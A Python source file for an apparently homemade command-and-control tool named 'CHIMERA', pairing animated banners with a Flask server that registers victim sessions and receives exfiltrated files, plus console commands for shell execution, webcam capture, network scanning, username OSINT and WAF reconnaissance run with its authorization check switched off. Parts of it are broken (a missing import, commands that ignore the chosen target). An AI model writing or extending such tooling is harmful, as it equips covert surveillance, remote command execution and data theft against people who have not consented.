import os
import sys
import json
import threading
import subprocess
import socket
import cv2
import nmap
import requests
from datetime import datetime
from flask import Flask, request, jsonify
from colorama import init, Fore, Style
import pyfiglet

# =============== CONFIGURATION ===============
init()  # Initialize Colorama

CHIMERA_CONFIG = {
    "C2_HOST": "0.0.0.0",
    "C2_PORT": 5000,
    "DATA_DIR": "./chimera_exfil/",
    "SHERLOCK_PATH": "./sherlock/sherlock.py"
}

os.makedirs(CHIMERA_CONFIG["DATA_DIR"], exist_ok=True)

# =============== BANNER ASSETS ===============

def animate_falcon():
    """The flying falcon animation."""
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\n\n")
    
    x = -20
    # Simple ASCII Falcon
    falcon_art = [
        "          \       /            ",
        "           \  '  /             ",
        "         '- .`-'. .-'          ",
        "      .' .-' . `-. `-.         ",
        "   .' .-'   .   `-.   `-.      ",
        "   \\   /     \\     \\     \\     ",
        "    `-/       `     `      `   "
    ]
    
    while x < 80:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\n\n")
        
        # Move down a bit
        for _ in range(8):
            print()
            
        # Print the falcon at position X
        prefix = " " * x
        color = Fore.MAGENTA
        for line in falcon_art:
            print(f"        {prefix}{color}{line}{Style.RESET_ALL}")
        
        # Trail effect
        if x > 5:
            trail = " " * (x - 5) + Fore.CYAN + " ~ ~ ~ " + Style.RESET_ALL
            print(trail)
            
        x += 3
        time.sleep(0.08)
    
    time.sleep(0.5)

def print_glowing_banner():
    """The glowing text banner."""
    try:
        banner = pyfiglet.figlet_format("CHIMERA", font="slant")
    except:
        banner = "CHIMERA"
    
    lines = banner.split('\n')
    colors = [Fore.CYAN, Fore.MAGENTA, Fore.BLUE, Fore.GREEN]
    
    print(Fore.RED + "="*70 + Style.RESET_ALL)
    print()
    
    for i, line in enumerate(lines):
        color = colors[i % len(colors)]
        print(" " + line)  # Shadow
        print(f"    {color}{line}{Style.RESET_ALL}")
    
    print()
    print(Fore.RED + "="*70 + Style.RESET_ALL)
    
    # Developer Tag
    print(f"\n\n    {Fore.YELLOW}{Style.BRIGHT}>>> DEVELOPED BY: CVJ THE CYBER WOLF {Style.RESET_ALL}")
    print(f"    {Fore.CYAN}[*] Boot Sequence Complete. Loading Modules...{Style.RESET_ALL}")
    print()

# =============== CHIMERA CORE LOGIC ===============

class ChimeraModule:
    def __init__(self):
        self.sessions = {}
        self.inventory = []

    def pegasus_camera_grab(self):
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                img_path = f"{CHIMERA_CONFIG['DATA_DIR']}surveillance.jpg"
                cv2.imwrite(img_path, frame)
                return {"status": "success", "path": img_path}
            cap.release()
        except Exception as e:
            return {"status": "failed", "error": str(e)}

    def ghost_execute(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return {"output": result.decode('utf-8')}
        except Exception as e:
            return {"error": str(e)}

    def fing_network_scan(self, subnet):
        nm = nmap.PortScanner()
        nm.scan(hosts=subnet, arguments='-sn')
        hosts = []
        for host in nm.all_hosts():
            hosts.append({
                'ip': host,
                'mac': nm[host]['addresses'].get('mac', 'N/A'),
                'status': nm[host].state()
            })
        return hosts

    def sherlock_osint(self, username):
        try:
            result = subprocess.run(
                ['python', CHIMERA_CONFIG['SHERLOCK_PATH'], username],
                capture_output=True, text=True
            )
            return result.stdout
        except Exception as e:
            return str(e)

# =============== FLASK C2 SERVER ===============

app = Flask(__name__)
chimera = ChimeraModule()

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    session_id = data.get('id')
    chimera.sessions[session_id] = {
        "ip": request.remote_addr,
        "os": data.get('os'),
        "registered": datetime.now().isoformat()
    }
    print(f"{Fore.GREEN}[+] NEW BLOOD: {session_id} from {request.remote_addr}{Style.RESET_ALL}")
    return jsonify({"status": "registered", "session": session_id})

@app.route('/exfil', methods=['POST'])
def receive_data():
    if 'file' in request.files:
        file = request.files['file']
        filepath = os.path.join(CHIMERA_CONFIG["DATA_DIR"], file.filename)
        file.save(filepath)
        print(f"{Fore.CYAN}[+] DATA JACKED: {filepath}{Style.RESET_ALL}")
    return jsonify({"status": "received"})

# =============== CLI INTERFACE ===============

def cli_interface():
    """The main CLI after the banner plays."""
    print(f"\n{Fore.WHITE}CHIMERA C2 Console {Style.RESET_ALL}| Type 'help' to list commands | 'exit' to quit")
    while True:
        try:
            raw_cmd = input(f"\nCHIMERA> ").strip()
            if not raw_cmd:
                continue

            cmd = raw_cmd.split()
            command = cmd[0].lower()

            if command == "help":
                print("""
    🛠️  COMMANDS:
      sessions          : List active targets
      scan <subnet>     : Network discovery (Fing)
      camera <id>       : Grab target cam (Pegasus)
      exec <id> <cmd>   : Execute shell cmd (Ghost)
      sherlock <user>   : OSINT profile (Sherlock)
      falcon <target>   : WAF architecture recon (Peregrine Falcon)
      clear             : Clear screen
                """)
            
            elif command == "sessions":
                print(json.dumps(chimera.sessions, indent=2))

            elif command == "scan":
                if len(cmd) < 2:
                    print("Usage: scan <subnet>")
                    continue
                subnet = cmd[1]
                results = chimera.fing_network_scan(subnet)
                print(json.dumps(results, indent=2))

            elif command == "camera":
                result = chimera.pegasus_camera_grab()
                print(json.dumps(result, indent=2))

            elif command == "exec":
                if len(cmd) < 3:
                    print("Usage: exec <id> <cmd>")
                    continue
                command_payload = " ".join(cmd[2:])
                result = chimera.ghost_execute(command_payload)
                print(json.dumps(result, indent=2))

            elif command == "sherlock":
                if len(cmd) < 2:
                    print("Usage: sherlock <username>")
                    continue
                output = chimera.sherlock_osint(cmd[1])
                print(output)

            elif command == "falcon":
                if len(cmd) < 2:
                    print("Usage: falcon <target> [output.json]")
                    continue
                target = cmd[1]
                output_file = cmd[2] if len(cmd) > 2 else None
                from modules import peregrine_falcon

                peregrine_falcon.run_peregrine(
                    target=target,
                    output_file=output_file,
                    confirm_authorization=False,
                )

            elif command == "clear":
                os.system('cls' if os.name == 'nt' else 'clear')
                # Reprint a small header
                print(f"{Fore.MAGENTA}CHIMERA C2{Style.RESET_ALL} - Active Sessions:")
            
            elif command == "exit":
                print(f"{Fore.RED}[*] Standing down. Stay sharp.{Style.RESET_ALL}")
                sys.exit()
            
            else:
                print(f"[-] Unknown command. Type 'help'.")
                
        except KeyboardInterrupt:
            print("\n\nUse 'exit' to quit.")
        except Exception as e:
            print(f"[-] Error: {e}")

# =============== MAIN FUNCTION ===============

if __name__ == '__main__':
    # --- PLAY THE BANNER FIRST ---
    animate_falcon()
    print_glowing_banner()
    
    # --- START THE C2 SERVER IN BACKGROUND ---
    def run_server():
        app.run(host=CHIMERA_CONFIG["C2_HOST"], port=CHIMERA_CONFIG["C2_PORT"], debug=False, use_reloader=False)
    
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()
    
    # --- START THE CLI ---
    cli_interface()
